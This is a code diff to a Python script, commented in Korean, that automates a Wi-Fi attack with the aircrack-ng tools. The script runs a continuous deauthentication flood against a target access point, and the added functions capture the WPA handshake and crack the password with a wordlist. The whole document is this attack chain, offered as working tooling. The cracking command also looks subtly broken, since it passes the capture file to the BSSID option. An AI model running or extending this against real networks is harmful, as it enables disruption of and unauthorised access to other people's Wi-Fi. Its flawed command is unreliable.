@@ -41,6 +41,16 @@ def run_aireplay(bssid, interface, essid):
     aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, interface]
     subprocess.run(aireplay_cmd)
 
+def capture_handshake(interface, bssid, channel):
+    # airodump-ng로 핸드셰이크 캡처
+    airodump_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", interface]
+    subprocess.run(airodump_cmd, timeout=60)  # 60초 동안 핸드셰이크 캡처 시도
+
+def crack_password(handshake_file, wordlist):
+    # aircrack-ng로 비밀번호 크랙
+    aircrack_cmd = ["sudo", "aircrack-ng", "-w", wordlist, "-b", handshake_file]
+    subprocess.run(aircrack_cmd)
+
 def main():
     # 네트워크 인터페이스 출력
     interfaces = get_network_interfaces()
@@ -97,6 +107,14 @@ def main():
         
         # aireplay-ng 실행 및 target.csv에 기록
         run_aireplay(bssid, selected_interface, essid)
+
+        # 핸드셰이크 캡처
+        capture_handshake(selected_interface, bssid, channel)
+
+        # 비밀번호 크랙
+        handshake_file = "handshake-01.cap"
+        wordlist = "wordlist.txt"  # 크랙에 사용할 워드리스트 파일 경로
+        crack_password(handshake_file, wordlist)
 
     else:
         print("잘못된 선택입니다.")
